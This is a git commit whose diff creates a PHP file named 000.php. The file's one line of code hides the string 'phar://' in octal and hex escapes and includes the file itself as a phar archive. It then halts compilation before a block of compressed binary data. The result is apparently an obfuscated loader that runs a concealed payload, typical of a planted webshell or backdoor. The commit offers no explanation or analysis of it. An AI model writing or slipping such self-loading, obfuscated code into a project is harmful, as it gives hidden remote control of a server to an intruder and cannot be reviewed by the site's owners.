ce9779bf667c2a7d0369d1231bee453b3c84b67c
JH1 <117314594+JH1x000f93@users.noreply.github.com>
2023-06-20 21:48:34 -0600

    Create 000.php

---
+++ 000.php
@@ -0,0 +1,6 @@
+<?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/x�Vɏ�$�U�QK�0���+J�hB�S7�j���O>�Y��v��%%�D����r����c��S|�:~	��f��bD�b5^�����
+           �]�KS�ˇg��^�j0���L���t�ޥ�Z�VC
+                                        :NRBwV��W�l����`W�I2��+��	�Y6�e"�d� ��nޠ]�~#�oz�1��(m���-U�;ΦT�_e�JM٤hl��c������]�a:��?F&&pJ݈�+)|]�
+�
+jo��a}��y���o�E�p1/
+               �)u�����3&o?ϋ��fʤ�EΠ�V�#�})�n�%��DOv�8��8��ҿ�GBMB
